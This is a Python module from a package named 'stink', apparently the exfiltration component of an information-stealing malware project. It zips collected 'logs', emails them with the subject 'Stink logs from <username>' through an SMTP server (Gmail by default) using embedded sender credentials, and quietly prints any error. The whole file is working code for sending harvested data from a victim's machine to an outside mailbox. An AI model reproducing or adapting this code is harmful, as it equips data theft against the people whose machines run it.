from os import path
from smtplib import SMTP
from getpass import getuser
from email.message import EmailMessage, Message

from stink.abstract import AbstractSender


class Smtp(AbstractSender):
    """
    Sender for the Email.
    """
    def __init__(self, sender_email: str, sender_password: str, recipient_email: str, smtp_server: str = "smtp.gmail.com", smtp_port: int = 587):
        super().__init__()

        self.__sender_email = sender_email
        self.__sender_password = sender_password
        self.__recipient_email = recipient_email

        self.__smtp_server = smtp_server
        self.__smtp_port = smtp_port

    def __get_sender_data(self) -> Message:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of content type, body, and server route.
        """
        message = EmailMessage()
        message["From"] = self.__sender_email
        message["To"] = self.__recipient_email
        message["Subject"] = f"Stink logs from {getuser()}"

        with open(path.join(path.dirname(self.__storage_path), rf"{self.__zip_name}.zip"), "rb") as file:
            message.add_attachment(
                file.read(), maintype="application", subtype="octet-stream", filename=self.__zip_name
            )

        return message

    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        message = self.__get_sender_data()
        server = SMTP(self.__smtp_server, self.__smtp_port)

        server.starttls()
        server.login(self.__sender_email, self.__sender_password)
        server.send_message(message)
        server.quit()

    def run(self, zip_name: str, storage_path: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - storage_path [str]: Path to storage.

        Returns:
        - None.
        """
        self.__zip_name = zip_name
        self.__storage_path = storage_path

        try:

            self.__send_archive()

        except Exception as e:
            print(f"[Smtp sender]: {repr(e)}")
